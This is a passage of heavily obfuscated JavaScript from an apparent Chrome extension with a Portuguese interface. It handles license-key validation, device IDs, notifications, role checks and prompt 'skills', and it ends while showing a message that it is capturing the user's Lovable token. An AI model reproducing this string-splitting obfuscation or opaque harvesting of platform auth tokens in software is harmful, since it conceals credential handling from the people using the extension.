_n534948['cla'+'ssN'+'ame']='sp-'+'ale'+'rt-'+'ove'+'rla'+'y',_n534948['inn'+'erH'+'TML']=spTemplateAlert(_n33bb89,_n3e4700),document['bod'+'y']['app'+'end'+'Chi'+'ld'](_n534948),_n534948['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-al'+'ert'+'-ok')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>_n534948['rem'+'ove']()),setTimeout(()=>_n534948['rem'+'ove'](),0xfa0);
}
document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n27976d=>{
const _n51b2c4=_n27976d['tar'+'get']['clo'+'ses'+'t']('#ql'+'-th'+'eme'+'-bt'+'n');
if(_n51b2c4){
const _n3164b1=document['doc'+'ume'+'ntE'+'lem'+'ent'],_n8a695e=_n3164b1['get'+'Att'+'rib'+'ute']('dat'+'a-t'+'hem'+'e')||'lig'+'ht',_n1060fa=_n8a695e==='dar'+'k'?'lig'+'ht':'dar'+'k';
_n3164b1['set'+'Att'+'rib'+'ute']('dat'+'a-t'+'hem'+'e',_n1060fa);
const _n321928=document['get'+'Ele'+'men'+'tBy'+'Id']('the'+'meK'+'nob');
if(_n321928)_n321928['inn'+'erH'+'TML']=_n1060fa==='dar'+'k'?SP_SVG['moo'+'n']:SP_SVG['sun'];
document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('#ql'+'-th'+'eme'+'-bt'+'n')['for'+'Eac'+'h'](_n311acc=>{
if(_n311acc!==_n51b2c4){
}
}
);
const _n2e84d2={
}
;
_n2e84d2['ql_'+'dar'+'k_m'+'ode']=_n1060fa==='dar'+'k',chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n2e84d2);
}
}
),document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-lo'+'gou'+'t-b'+'tn')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>_n4ce99a(null));
const _nf36591=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'not'+'if-'+'pan'+'el');
document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-no'+'tif'+'-bt'+'n')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n246bd0=>{
_n246bd0['sto'+'pPr'+'opa'+'gat'+'ion']();
const _n5253cd=_nf36591['sty'+'le']['dis'+'pla'+'y']!=='non'+'e';
_nf36591['sty'+'le']['dis'+'pla'+'y']=_n5253cd?'non'+'e':'blo'+'ck';
if(!_n5253cd)_n5770ef();
}
),document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'not'+'if-'+'clo'+'se')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
_nf36591['sty'+'le']['dis'+'pla'+'y']='non'+'e';
}
);
async function _n5770ef(){
const _n4e55f4=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'not'+'if-'+'lis'+'t');
_n4e55f4['inn'+'erH'+'TML']='<p\x20'+'cla'+'ss='+'\x22sp'+'-no'+'tif'+'-em'+'pty'+'\x22>'+spT('loa'+'din'+'g')+('</p'+'>');
try{
const _n1e17f1={
}
;
_n1e17f1['api'+'key']=_n3920b8,_n1e17f1['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n3920b8;
const _n4464ca={
}
;
_n4464ca['met'+'hod']='GET',_n4464ca['hea'+'der'+'s']=_n1e17f1;
const _n34993a=await _n530b76(_n65ee61,_n4464ca);
if(!_n34993a||!_n34993a['len'+'gth']){
_n4e55f4['inn'+'erH'+'TML']='<p\x20'+'cla'+'ss='+'\x22sp'+'-no'+'tif'+'-em'+'pty'+'\x22>'+spT('not'+'if_'+'emp'+'ty')+('</p'+'>');
return;
}
const _nea69fd=_n34993a['map'](_n1299ac=>_n1299ac['id']),_n298d18={
}
;
_n298d18['ql_'+'rea'+'d_n'+'oti'+'fs']=_nea69fd,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n298d18);
const _n43c133=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-no'+'tif'+'-ba'+'dge');
if(_n43c133)_n43c133['sty'+'le']['dis'+'pla'+'y']='non'+'e';
_n4e55f4['inn'+'erH'+'TML']=_n34993a['map'](_n504385=>spTemplateNotifItem(_n504385))['joi'+'n']('');
}
catch(_n29df11){
_n4e55f4['inn'+'erH'+'TML']='<p\x20'+'cla'+'ss='+'\x22sp'+'-no'+'tif'+'-em'+'pty'+'\x22>'+spT('not'+'if_'+'err'+'or')+('</p'+'>');
}
}
async function _n167fc3(){
try{
const _n4967ec={
}
;
_n4967ec['api'+'key']=_n3920b8,_n4967ec['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n3920b8;
const _n4e5cd={
}
;
_n4e5cd['met'+'hod']='GET',_n4e5cd['hea'+'der'+'s']=_n4967ec;
const _n210747=await _n530b76(_n65ee61,_n4e5cd);
if(!_n210747||!_n210747['len'+'gth'])return;
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'rea'+'d_n'+'oti'+'fs'],_n223f85=>{
const _n33fc6e=_n223f85['ql_'+'rea'+'d_n'+'oti'+'fs']||[],_n32893f=_n210747['fil'+'ter'](_n1337fc=>!_n33fc6e['inc'+'lud'+'es'](_n1337fc['id']))['len'+'gth'],_n39f5cb=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-no'+'tif'+'-ba'+'dge');
_n39f5cb&&(_n39f5cb['tex'+'tCo'+'nte'+'nt']=_n32893f,_n39f5cb['sty'+'le']['dis'+'pla'+'y']=_n32893f>0x0?'fle'+'x':'non'+'e');
}
);
}
catch(_n1413fe){
}
}
async function _n584b13(){
try{
const _n46c525={
}
;
_n46c525['api'+'key']=_n3920b8,_n46c525['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n3920b8;
const _n12e4e3={
}
;
_n12e4e3['met'+'hod']='GET',_n12e4e3['hea'+'der'+'s']=_n46c525;
const _n4e03cc=await _n530b76(_n4a99ce,_n12e4e3);
if(!_n4e03cc||!_n4e03cc['len'+'gth'])return;
const _n229280=_n4e03cc[0x0];
if(_n229280['ver'+'sio'+'n']!==_n4ca228&&_n229280['is_'+'ale'+'rt_'+'act'+'ive']){
const _ne0cc6=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'upd'+'ate'+'-ba'+'nne'+'r');
if(_ne0cc6){
const _n2d8409=_n229280['fil'+'e_p'+'ath']?_n2ad277+('/st'+'ora'+'ge/'+'v1/'+'obj'+'ect'+'/pu'+'bli'+'c/e'+'xte'+'nsi'+'on-'+'rel'+'eas'+'es/')+_n229280['fil'+'e_p'+'ath']:null;
_ne0cc6['inn'+'erH'+'TML']=spTemplateUpdateBanner(_n229280['ver'+'sio'+'n'],_n229280['cha'+'nge'+'log'],_n2d8409),_ne0cc6['sty'+'le']['dis'+'pla'+'y']='blo'+'ck';
var _n4ba579=_ne0cc6['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-up'+'dat'+'e-o'+'pen'+'-bt'+'n');
_n4ba579&&_n2d8409&&_n4ba579['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function(){
window['ope'+'n'](_n2d8409,'_bl'+'ank');
}
);
}
}
}
catch(_n3a9b96){
}
}
async function _n1dcf69(){
try{
const _n53a4a6={
}
;
_n53a4a6['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n53a4a6['api'+'key']=_n3920b8;
const _n37009a=await _n530b76(_n3628dc,{
'method':'POS'+'T','headers':_n53a4a6,'body':JSON['str'+'ing'+'ify']({
'user_id':await _n3a621c()}
)}
);
if(_n37009a&&Array['isA'+'rra'+'y'](_n37009a)&&_n37009a['som'+'e'](_n119ace=>_n119ace['rol'+'e']==='res'+'ell'+'er'||_n119ace['rol'+'e']==='adm'+'in')){
_n139915=!![];
const _n2fe160=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'res'+'ell'+'er-'+'btn');
if(_n2fe160)_n2fe160['sty'+'le']['dis'+'pla'+'y']='blo'+'ck';
}
}
catch(_n4285f7){
}
}
async function _n3a621c(){
return new Promise(_n4253c2=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lk'],async _n3b2b4b=>{
if(!_n3b2b4b['ql_'+'lk'])return _n4253c2('');
try{
const _n410a1={
}
;
_n410a1['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n410a1['api'+'key']=_n3920b8;
const _n1f873f={
}
;
_n1f873f['lic'+'ens'+'e_k'+'ey']=_n3b2b4b['ql_'+'lk'];
const _n3909d8=await _n530b76(_n2ad277+('/fu'+'nct'+'ion'+'s/v'+'1/g'+'et-'+'lic'+'ens'+'e-u'+'ser'),{
'method':'POS'+'T','headers':_n410a1,'body':JSON['str'+'ing'+'ify'](_n1f873f)}
);
if(_n3909d8&&_n3909d8['len'+'gth']&&_n3909d8[0x0]['use'+'r_i'+'d'])_n4253c2(_n3909d8[0x0]['use'+'r_i'+'d']);
else _n4253c2('');
}
catch(_n210c52){
_n4253c2('');
}
}
));
}
function _n29f51a(){
const _n3702f1=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'bod'+'y');
_n3702f1['inn'+'erH'+'TML']=spTemplateLicenseGate(),document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'val'+'ida'+'te-'+'btn')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n5bebac);
const _n5a923f=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'res'+'et-'+'lic'+'ens'+'e-l'+'ink');
_n5a923f&&_n5a923f['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
const _n17fd49=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lic'+'ens'+'e-i'+'npu'+'t'),_n5ac3c0=(_n17fd49&&_n17fd49['val'+'ue']?_n17fd49['val'+'ue']:'')['tri'+'m']();
_n2146b4(_n5ac3c0,async _n3fb8ea=>{
_n5a923f['dis'+'abl'+'ed']=!![],_n5a923f['tex'+'tCo'+'nte'+'nt']=spT('lic'+'ens'+'e_g'+'ate'+'_re'+'set'+'_lo'+'adi'+'ng');
const _n2af658=await _n5950c4(_n3fb8ea);
_n5a923f['dis'+'abl'+'ed']=![],_n5a923f['tex'+'tCo'+'nte'+'nt']=spT('lic'+'ens'+'e_g'+'ate'+'_re'+'set'+'_li'+'nk'),_n176391((_n2af658['ok']?'✓\x20':'✗\x20')+_n2af658['mes'+'sag'+'e']);
}
);
}
);
const _n1ac873=document['doc'+'ume'+'ntE'+'lem'+'ent']['get'+'Att'+'rib'+'ute']('dat'+'a-t'+'hem'+'e')==='dar'+'k';
document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('#ql'+'-th'+'eme'+'-bt'+'n')['for'+'Eac'+'h'](_n5a5b57=>{
const _n4116e4=_n5a5b57['que'+'ryS'+'ele'+'cto'+'r']('#th'+'eme'+'Kno'+'b');
_n4116e4?_n4116e4['inn'+'erH'+'TML']=_n1ac873?SP_SVG['moo'+'n']:SP_SVG['sun']:_n5a5b57['inn'+'erH'+'TML']=_n1ac873?SP_SVG['moo'+'n']:SP_SVG['sun'];
}
);
if(_n1ad1e7){
const _n42cb69=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lic'+'ens'+'e-l'+'og');
_n42cb69&&(_n42cb69['sty'+'le']['dis'+'pla'+'y']='blo'+'ck',_n42cb69['tex'+'tCo'+'nte'+'nt']=_n1ad1e7),_n1ad1e7=null;
}
}
async function _n5bebac(){
const _n38ec1f=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lic'+'ens'+'e-i'+'npu'+'t'),_n39f532=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lic'+'ens'+'e-l'+'og'),_nda6518=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'val'+'ida'+'te-'+'btn');
function _nde256d(_n4b614c,_n7e8065){
if(!_n39f532)return;
_n39f532['sty'+'le']['dis'+'pla'+'y']='blo'+'ck',_n39f532['sty'+'le']['col'+'or']=_n7e8065?'#ff'+'4d6'+'d':'#00'+'e5f'+'f',_n39f532['tex'+'tCo'+'nte'+'nt']=_n4b614c;
}
function _n4aae28(){
_nda6518&&(_nda6518['dis'+'abl'+'ed']=![],_nda6518['tex'+'tCo'+'nte'+'nt']='Ati'+'var'+'\x20Ag'+'ora');
}
const _n2b547c=_n38ec1f?_n38ec1f['val'+'ue']['tri'+'m']()['toU'+'ppe'+'rCa'+'se']():'';
if(!_n2b547c){
_nde256d('⚠\x20I'+'nsi'+'ra\x20'+'uma'+'\x20ch'+'ave'+'\x20de'+'\x20li'+'cen'+'ça',!![]);
return;
}
_nda6518&&(_nda6518['dis'+'abl'+'ed']=!![],_nda6518['tex'+'tCo'+'nte'+'nt']='⏳\x20V'+'ali'+'dan'+'do.'+'..');
_nde256d('⏳\x20C'+'one'+'cta'+'ndo'+'\x20ao'+'\x20se'+'rvi'+'dor'+'...',![]);
try{
await new Promise(_n253a34=>{
try{
const _n48a23c={
}
;
_n48a23c['act'+'ion']='pin'+'g',chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n48a23c,()=>_n253a34());
}
catch(_n395bbc){
_n253a34();
}
setTimeout(_n253a34,0x258);
}
);
}
catch(_n20f96a){
}
try{
let _nb4f430=_n2b547c,_n51d03f=null,_n7aa44f=null,_n2502f9=null;
const _n20a1c6=window['_lv'+'c']||window['Que'+'enS'+'yst'+'em'];
if(_n20a1c6?.['res'+'olv'+'eLi'+'cen'+'se']){
const _n4f8570=await _n20a1c6['res'+'olv'+'eLi'+'cen'+'se'](_n2b547c);
if(!_n4f8570['ok']){
_nde256d(_n411d15(_n4f8570)?spT('log'+'in_'+'dev'+'ice'+'_co'+'nfl'+'ict'):'✗\x20'+_n4f8570['mes'+'sag'+'e'],!![]),_n4aae28();
return;
}
_nb4f430=_n4f8570['lic'+'ens'+'e_k'+'ey'],_n51d03f=_n4f8570['dev'+'ice'+'_id'],_n7aa44f=_n4f8570['chi'+'ld_'+'lic'+'ens'+'e_k'+'ey']||null,_n2502f9=_n4f8570['not'+'ice']||null;
}
else{
if(/^LVB-[A-Z0-9]{
5}
-[A-Z0-9]{
5}
-[A-Z0-9]{
5}
$/['tes'+'t'](_n2b547c)||/^[A-Z0-9]{
5}
-[A-Z0-9]{
5}
-[A-Z0-9]{
5}
$/['tes'+'t'](_n2b547c)||/^TRIAL10MIN-[A-Z0-9]{
6,}
$/['tes'+'t'](_n2b547c))_nb4f430=_n2b547c,_n7aa44f=_n2b547c;
else{
if(/^HYPER-[A-Z0-9-]+$/['tes'+'t'](_n2b547c))_nb4f430=_n2b547c;
else{
_nde256d('✗\x20F'+'orm'+'ato'+'\x20de'+'\x20li'+'cen'+'ça\x20'+'inv'+'áli'+'do',!![]),_n4aae28();
return;
}
}
}
if(!_n2f3531)_n2f3531=await _n54429f();
const _n3272a3=_n51d03f||_n2f3531,_n10c275={
}
;
_n10c275['que'+'enK'+'ey']=_nb4f430,_n10c275['chi'+'ldK'+'ey']=_n7aa44f,_n10c275['ses'+'sio'+'nId']=null,_n10c275['dev'+'ice'+'IdV'+'alu'+'e']=_n3272a3,_n10c275['use'+'rNa'+'meV'+'alu'+'e']=null,_n10c275['exp'+'ire'+'sAt'+'Val'+'ue']=null,_n10c275['act'+'iva'+'ted'+'AtV'+'alu'+'e']=null,_n10c275['sta'+'tus'+'Val'+'ue']=_n7aa44f?'tri'+'al':null;
const _nc2fdca=await _n3ebccc(_n10c275);
if(_nc2fdca['val'+'id']){
_nde256d('✓\x20A'+'tiv'+'and'+'o..'+'.',![]),_n6a372d=_nc2fdca['ses'+'sio'+'n_i'+'d'],_n1ba7e3=_nc2fdca['use'+'r_n'+'ame'],_n10b465=_nc2fdca['exp'+'ire'+'s_a'+'t'],_n472837=_nc2fdca['sta'+'tus'],_n13f13d(_n10b465);
const _n36d8e3={
}
;
_n36d8e3['ql_'+'lic'+'ens'+'e_v'+'ali'+'d']=!![],_n36d8e3['ql_'+'lk']=_nb4f430,_n36d8e3['ql_'+'ses'+'sio'+'n_i'+'d']=_nc2fdca['ses'+'sio'+'n_i'+'d'],_n36d8e3['ql_'+'use'+'r_n'+'ame']=_nc2fdca['use'+'r_n'+'ame']||null,_n36d8e3['ql_'+'exp'+'ire'+'s_a'+'t']=_nc2fdca['exp'+'ire'+'s_a'+'t']||null,_n36d8e3['ql_'+'act'+'iva'+'ted'+'_at']=_nc2fdca['act'+'iva'+'ted'+'_at']||null,_n36d8e3['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']=_nc2fdca['sta'+'tus']||null,_n36d8e3['ql_'+'ed']=_n3272a3,_n36d8e3['ql_'+'ck']=_n7aa44f,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n36d8e3,()=>{
_nde256d('✓\x20'+(_n2502f9||(_n7aa44f?'Lic'+'enç'+'a\x20a'+'tiv'+'ada'+'\x20co'+'m\x20s'+'uce'+'sso'+'!':_nc2fdca['mes'+'sag'+'e'])),![]),_n3ee618=!![],setTimeout(()=>{
_n3e2964(),_n4ae681(_nb4f430);
}
,0x320);
}
);
}
else{
const _n23cdad=_n411d15(_nc2fdca)?spT('log'+'in_'+'dev'+'ice'+'_co'+'nfl'+'ict'):'✗\x20'+(_nc2fdca['mes'+'sag'+'e']||spT('log'+'in_'+'inv'+'ali'+'d_e'+'xpi'+'red'));
_nde256d(_n23cdad,!![]),_n4aae28();
}
}
catch(_n2de808){
_nde256d('✗\x20E'+'rro'+'\x20de'+'\x20co'+'nex'+'ão.'+'\x20Te'+'nte'+'\x20no'+'vam'+'ent'+'e.',!![]),_n4aae28();
}
}
function _n2ff1e7(_n4588bc){
chrome['sto'+'rag'+'e']['loc'+'al']['get']([_n3f0c2a],_n42cd13=>{
const _n59cb70=_n42cd13[_n3f0c2a];
_n1bd680=Array['isA'+'rra'+'y'](_n59cb70)?_n59cb70:[];
if(_n4588bc)_n4588bc();
}
);
}
function _n36ed81(){
if(_n1bd680['len'+'gth']>_n39343c)_n1bd680=_n1bd680['sli'+'ce'](-_n39343c);
const _n808940={
}
;
_n808940[_n3f0c2a]=_n1bd680,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n808940);
}
function _n2a4116(_n407ab9,_neda6bf){
_n1bd680['pus'+'h']({
'text':_n407ab9,'timestamp':new Date()['toI'+'SOS'+'tri'+'ng'](),'status':_neda6bf||'ok'}
),_n36ed81(),_n2e7d03();
}
function _n2e7d03(){
var _n19a575=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-ta'+'b[d'+'ata'+'-ta'+'b=\x22'+'his'+'tor'+'y\x22]'+'\x20.s'+'p-t'+'ab-'+'bad'+'ge');
if(_n19a575)_n19a575['tex'+'tCo'+'nte'+'nt']=_n1bd680['len'+'gth'];
}
function _n5c48c5(){
var _n47a09d=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n47a09d)return;
_n47a09d['inn'+'erH'+'TML']=spTemplateChatHistory(_n1bd680);
var _n426437=_n47a09d['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-ch'+'at-'+'mes'+'sag'+'es');
if(_n426437)_n426437['scr'+'oll'+'Top']=_n426437['scr'+'oll'+'Hei'+'ght'];
var _n67857f=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cha'+'t-c'+'lea'+'r');
_n67857f&&_n67857f['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function(){
_n1bd680=[],_n36ed81(),_n5c48c5();
}
),_n47a09d['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('.sp'+'-hi'+'sto'+'ry-'+'use')['for'+'Eac'+'h'](_n57778a=>{
_n57778a['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
const _n236b13=_n57778a['get'+'Att'+'rib'+'ute']('dat'+'a-t'+'ext');
_nec67e5('pro'+'mpt');
const _n5a05ad=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'msg');
_n5a05ad&&(_n5a05ad['val'+'ue']=_n236b13,_n5a05ad['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut')));
}
);
}
);
}
function _n151f74(){
var _n1aa188=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n1aa188)return;
_n1aa188['inn'+'erH'+'TML']=spTemplatePromptContent();
}
async function _n509106(){
var _n427114=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(!_n427114)return;
_n427114['inn'+'erH'+'TML']='<di'+'v\x20s'+'tyl'+'e=\x22'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er;
'+'pad'+'din'+'g:2'+'8px'+'\x2016'+'px;
'+'col'+'or:'+'var'+'(--'+'tex'+'t-s'+'ub)'+';
fo'+'nt-'+'siz'+'e:1'+'1px'+';
an'+'ima'+'tio'+'n:s'+'p-f'+'ade'+'-sl'+'ide'+'\x20.3'+'s\x20e'+'ase'+';
\x22>'+'🧩\x20C'+'arr'+'ega'+'ndo'+'\x20sk'+'ill'+'s..'+'.</'+'div'+'>';
try{
var _n57259b=await _n47e90c(),_n3845cb=await _n5285df(),_n139a12=await _n4f8249();
_n1bed2b=_n139a12,_n427114['inn'+'erH'+'TML']=spTemplateSkillsContent(_n57259b,_n3845cb,_n139a12,_n12c2f4,_ne2d945),_n4bcb37();
}
catch(_n1678b3){
_n427114['inn'+'erH'+'TML']='<di'+'v\x20s'+'tyl'+'e=\x22'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er;
'+'pad'+'din'+'g:2'+'8px'+'\x2016'+'px;
'+'col'+'or:'+'#ff'+'555'+'5;
f'+'ont'+'-si'+'ze:'+'11p'+'x;
\x22'+'>❌\x20'+'Err'+'o\x20a'+'o\x20c'+'arr'+'ega'+'r\x20s'+'kil'+'ls.'+'<br'+'><s'+'pan'+'\x20st'+'yle'+'=\x22f'+'ont'+'-si'+'ze:'+'10p'+'x;
o'+'pac'+'ity'+':.7'+';
\x22>'+'Ver'+'ifi'+'que'+'\x20su'+'a\x20c'+'one'+'xão'+'.</'+'spa'+'n><'+'br>'+'<bu'+'tto'+'n\x20i'+'d=\x22'+'sp-'+'ski'+'lls'+'-re'+'fre'+'sh-'+'err'+'\x22\x20s'+'tyl'+'e=\x22'+'mar'+'gin'+'-to'+'p:1'+'0px'+';
ba'+'ckg'+'rou'+'nd:'+'non'+'e;
b'+'ord'+'er:'+'1px'+'\x20so'+'lid'+'\x20rg'+'ba('+'255'+',85'+',85'+',.4'+');
c'+'olo'+'r:#'+'ff5'+'555'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'8px'+';
pa'+'ddi'+'ng:'+'4px'+'\x2012'+'px;
'+'fon'+'t-s'+'ize'+':10'+'px;
'+'cur'+'sor'+':po'+'int'+'er;
'+'\x22>T'+'ent'+'ar\x20'+'nov'+'ame'+'nte'+'</b'+'utt'+'on>'+'</d'+'iv>';
var _n3a5ab3=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'ski'+'lls'+'-re'+'fre'+'sh-'+'err');
if(_n3a5ab3)_n3a5ab3['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function(){
_n227820=[],chrome['sto'+'rag'+'e']['loc'+'al']['rem'+'ove']([_n502e99]),_n509106();
}
);
}
}
async function _n47e90c(){
var _n400b74=Date['now'](),_n2b7e99=await new Promise(function(_n259273){
chrome['sto'+'rag'+'e']['loc'+'al']['get']([_n502e99,'ql_'+'ck','ql_'+'lk'],_n259273);
}
),_n5f06d2=_n2b7e99['ql_'+'ck']||_n2b7e99['ql_'+'lk']||'',_n3b739c=_n2b7e99[_n502e99],_n487243=_n3b739c&&_n3b739c['dat'+'a']&&_n400b74-_n3b739c['ts']<_n2565eb,_n5033fd=_n3b739c&&_n3b739c['acc'+'ess'+'Ts']&&_n400b74-_n3b739c['acc'+'ess'+'Ts']<0x1e*0x3e8;
if(_n487243&&_n5033fd)return _n227820=_n3b739c['dat'+'a'],_n12c2f4=_n3b739c['has'+'_sk'+'ill'+'s']===!![],_n227820;
const _n582541={
}
;
_n582541['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n';
const _n1ae828={
}
;
_n1ae828['lic'+'Key']=_n5f06d2;
var _n5dce06=await _n530b76(_n3c5b11,{
'method':'POS'+'T','headers':_n582541,'body':JSON['str'+'ing'+'ify'](_n1ae828)}
);
_n5dce06['has'+'_sk'+'ill'+'s']!==undefined&&(_n12c2f4=!!_n5dce06['has'+'_sk'+'ill'+'s']);
_n227820=_n5dce06['ski'+'lls']&&_n5dce06['ski'+'lls']['len'+'gth']>0x0?_n5dce06['ski'+'lls']:_n487243?_n3b739c['dat'+'a']:[];
var _nd837f5={
}
;
const _n567f05={
}
;
return _n567f05['dat'+'a']=_n227820,_n567f05['ts']=_n487243?_n3b739c['ts']:_n400b74,_n567f05['has'+'_sk'+'ill'+'s']=_n12c2f4,_n567f05['acc'+'ess'+'Ts']=_n400b74,_nd837f5[_n502e99]=_n567f05,_nd837f5['ql_'+'has'+'_sk'+'ill'+'s']=_n12c2f4,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_nd837f5),_n227820;
}
async function _n5285df(){
var _n65039b=await new Promise(function(_n145f6b){
chrome['sto'+'rag'+'e']['loc'+'al']['get']([_n218464],_n145f6b);
}
);
return _n65039b[_n218464]||[];
}
async function _n4f8249(){
if(!_n2b5999)return[];
var _n46d86f='ql_'+'ski'+'lls'+'_'+_n2b5999,_n4c7a5e=await new Promise(function(_n37ce9e){
chrome['sto'+'rag'+'e']['loc'+'al']['get']([_n46d86f],_n37ce9e);
}
),_n2b2eb0=_n4c7a5e[_n46d86f];
if(!_n2b2eb0)return[];
if(typeof _n2b2eb0==='str'+'ing')return[_n2b2eb0];
return Array['isA'+'rra'+'y'](_n2b2eb0)?_n2b2eb0:[];
}
function _n6bb826(_n59f8c5){
if(!_n2b5999)return;
var _n1711df={
}
;
_n1711df['ql_'+'ski'+'lls'+'_'+_n2b5999]=_n59f8c5,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n1711df);
}
async function _n40f3ba(_n36a029){
if(!_n12c2f4){
_n400ca0('🔒\x20F'+'aça'+'\x20o\x20'+'upg'+'rad'+'e\x20p'+'ara'+'\x20o\x20'+'pla'+'no\x20'+'Ski'+'lls'+'\x20pa'+'ra\x20'+'usa'+'r\x20e'+'sta'+'\x20fu'+'nci'+'ona'+'lid'+'ade'+'!','war'+'n',0xfa0);
return;
}
var _n502e05=_n227820['fin'+'d'](function(_nf5afa9){
return _nf5afa9['id']===_n36a029;
}
);
if(!_n502e05)return;
var _n11fca0=_n1bed2b['ind'+'exO'+'f'](_n36a029)!==-0x1,_nd1453a=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(_n11fca0){
_n1bed2b=_n1bed2b['fil'+'ter'](function(_n361160){
return _n361160!==_n36a029;
}
),_n6bb826(_n1bed2b);
var _n390b81=await _n5285df();
if(_nd1453a)_nd1453a['inn'+'erH'+'TML']=spTemplateSkillsContent(_n227820,_n390b81,_n1bed2b,_n12c2f4,_ne2d945);
_n400ca0(spT('toa'+'st_'+'ski'+'ll_'+'dea'+'cti'+'vat'+'ed')+'\x20'+spSkillLocalized(_n502e05,'nam'+'e'),'war'+'n',0x9c4);
}
else{
_n1bed2b=_n1bed2b['con'+'cat']([_n36a029]),_n6bb826(_n1bed2b);
var _n390b81=await _n5285df();
if(_nd1453a)_nd1453a['inn'+'erH'+'TML']=spTemplateSkillsContent(_n227820,_n390b81,_n1bed2b,_n12c2f4,_ne2d945);
_n400ca0(spT('toa'+'st_'+'ski'+'ll_'+'act'+'iva'+'tin'+'g')+'\x20'+spSkillLocalized(_n502e05,'nam'+'e')+'...','ok',0x2710);
var _n47531d=await _n4f1aa4(_n502e05['pro'+'mpt'+'_co'+'nte'+'nt'],spSkillLocalized(_n502e05,'nam'+'e'),spSkillLocalized(_n502e05,'des'+'cri'+'pti'+'on'));
if(!_n47531d){
_n1bed2b=_n1bed2b['fil'+'ter'](function(_n1e55e3){
return _n1e55e3!==_n36a029;
}
),_n6bb826(_n1bed2b);
var _nbd8644=await _n5285df(),_n4b63f3=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'tab'+'-co'+'nte'+'nt');
if(_n4b63f3)_n4b63f3['inn'+'erH'+'TML']=spTemplateSkillsContent(_n227820,_nbd8644,_n1bed2b,_n12c2f4,_ne2d945);
}
}
}
async function _n4f1aa4(_n29cf64,_n2960ed,_nb38018){
await new Promise(function(_n1e54e6){
_n5e6fc4(function(){
_n1e54e6();
}
);
}
);
var _n4e9223=await new Promise(function(_n152da8){
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lk','ql_'+'ck','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'ed'],_n152da8);
}
),_n37d6bf=_n4e9223['ql_'+'ck']||_n4e9223['ql_'+'lk']||'',_n76a626=_n39b796||'',_n471bd8=_n2b5999||'',_n59d24b=await _n19b41c()||_n4e9223['ql_'+'ed']||_n2f3531||'';
if(!_n76a626||!_n471bd8){
_n400ca0('⏳\x20C'+'apt'+'ura'+'ndo'+'\x20to'+'ken'+'\x20do'+'\x20Lo'+'vab'+'le.'+'..','war'+'n',0x2ee0),await new Promise(function(_n4d9a06){
